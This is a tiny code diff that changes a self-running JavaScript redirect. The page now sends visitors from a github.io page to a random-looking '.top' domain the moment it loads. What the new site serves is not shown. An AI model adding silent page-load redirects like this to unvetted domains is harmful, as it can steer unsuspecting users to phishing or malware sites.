@@ -1,5 +1,6 @@
 (function() {
-    window['location'] = 'https://ab168188z.github.io/baidulets/';
+    window['location'] = 'http://gdjtlwobd-7h4k3uyt-shrg.top/';
 })();
+
 
 
